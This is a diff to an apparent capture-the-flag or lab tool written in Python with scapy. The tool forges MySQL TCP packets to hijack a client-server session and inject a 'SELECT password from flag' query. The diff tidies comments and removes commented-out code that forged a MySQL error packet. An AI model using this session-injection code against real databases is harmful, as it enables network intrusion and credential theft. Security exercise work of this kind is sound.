@@ -44,7 +44,7 @@ class MySQL:
 		self.client = client
 		#log.error("init, {} {}".format(len(server), server))
 		# server -> client
-		# except the firsts 3 packets server only send PA
+		# except the first 3 packets server only send PA
 		self.layout_srv = scapy.Ether(
 			src=server.mac,
 			dst=host[1]
@@ -59,7 +59,7 @@ class MySQL:
 			ack = 1
 		)
 		# client -> server
-		# except the firsts 3 packets client only send PA
+		# except the first 3 packets client only send PA
 		self.layout_cli = scapy.Ether(
 			src=host[1],
 			dst=server.mac
@@ -84,12 +84,8 @@ class Protocol:
 	def detect_syn(self, name, pkt):
 		self.events.syn = self.events.syn + 1
 		self.events.fin = 0
+		# Set the port a SYN connexion
 		self.forge.nat(pkt[scapy.TCP].sport)
-		#if self.events.syn == 1:
-		#	self.client_mac = pkt[scapy.Ether].src
-		#elif self.events.syn == 2:
-		#	self.server_mac = pkt[scapy.Ether].src
-		#log.print("syn:\t{}".format(self.events.syn))
 
 	# Detect Fin packet, increment for FIN, and reset for all other flags
 	def detect_fin(self, name, pkt):
@@ -129,42 +125,6 @@ class Protocol:
 			self.forge.layout_cli.ack = pkt[scapy.TCP].seq + len(pkt[scapy.TCP].load)
 			scapy.sendp(self.forge.layout_cli / self.forge.query('SELECT password from flag'))
 
-	#def send_ack(self, name, pkt):
-		# Construct the source packet
-		#ack = scapy.Ether(src=self.mac,dst=self.client_mac)/lpkt.ack(error)
-
-	# Construct and send error packet
-	def send_error(self, name, pkt):
-#		lpkt.send(lpkt.ack(pkt))
-		#ack = scapy.Ether(src=self.mac,dst='02:42:ac:12:00:03')/scapy.IP(src='172.18.0.2', dst='172.18.0.3')/scapy.TCP(
-		#	dport   = pkt[scapy.TCP].sport,
-		#	sport   = pkt[scapy.TCP].dport,
-		#	flags   = 'A',
-		#	seq	 = pkt[scapy.TCP].ack,
-		#	ack	 = pkt[scapy.TCP].seq
-		#)
-		#lpkt.send(ack)
-		# Create an error packet based on received packet
-		#error = lpkt.psh(pkt, "\x48\x00\x00\x02\xff\x15\x04\x23\x32\x38\x30\x30\x30\x41\x63\x63\x65\x73\x73\x20\x64\x65\x6e\x69\x65\x64\x20\x66\x6f\x72\x20\x75\x73\x65\x72\x20\x27\x72\x6f\x6f\x74\x27\x40\x27\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x27\x20\x28\x75\x73\x69\x6e\x67\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x4e\x4f\x29")
-#		error.payload = "\x48\x00\x00\x02\xff\x15\x04\x23\x32\x38\x30\x30\x30\x41\x63\x63\x65\x73\x73\x20\x64\x65\x6e\x69\x65\x64\x20\x66\x6f\x72\x20\x75\x73\x65\x72\x20\x27\x72\x6f\x6f\x74\x27\x40\x27\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x27\x20\x28\x75\x73\x69\x6e\x67\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x4e\x4f\x29"
-		# sned an ACK pakct in response to received packet
-		#lpkt.send(lpkt.ack(pkt))
-		# Construct the source packet
-		#error = scapy.Ether(src=self.mac,dst='02:42:ac:12:00:03')/scapy.IP(src='172.18.0.2', dst='172.18.0.3')/scapy.TCP(
-		#	dport   = pkt[scapy.TCP].sport,
-		#	sport   = pkt[scapy.TCP].dport,
-		#	flags   = 'PA',
-		#	seq	 = pkt[scapy.TCP].ack,
-		#	#ack	 = pkt[scapy.TCP].seq + len(pkt[scapy.TCP].load)
-		#) / scapy.Raw(load="\x48\x00\x00\x02\xff\x15\x04\x23\x32\x38\x30\x30\x30\x41\x63\x63\x65\x73\x73\x20\x64\x65\x6e\x69\x65\x64\x20\x66\x6f\x72\x20\x75\x73\x65\x72\x20\x27\x72\x6f\x6f\x74\x27\x40\x27\x31\x37\x32\x2e\x31\x38\x2e\x30\x2e\x33\x27\x20\x28\x75\x73\x69\x6e\x67\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x3a\x20\x4e\x4f\x29")
-		#error.ack	 = pkt[scapy.TCP].seq + len(error.load)
-		# Print the error packet
-		#log.packet(error)
-		log.print("payload sent!")
-		# Send the error packet
-		#lpkt.send(error)
-	
-	# WORK IN PROGRESS, sending the resquest packet
 	def send_request(self, name, pkt):
 		True
 
@@ -195,18 +155,6 @@ class Protocol:
 		self.events.add('detect psh', self.detect_psh, [
 			"tcp.flags == 0x018",
 		])
-		# Send error pack if the condition are met
-		#self.events.add('send error', self.send_error, [
-		#	"ack >= 1 and (tcp.flags == 'P' or tcp.flags == 'PA' or tcp.flags == 'AP')",
-		#])
-		# Register envent to send a request packet (Work in progress)
-		#self.events.add('send request', self.send_request, [
-		#	"False",
-		#])
-		# Register envent to send a request packet (Work in progress)
-		#self.events.add('send ack', self.send_request, [
-		#	"psh == 2",
-		#])
 		self.events.start()
 		# Check the thread is stated
 		log.print("condition loop thread started")
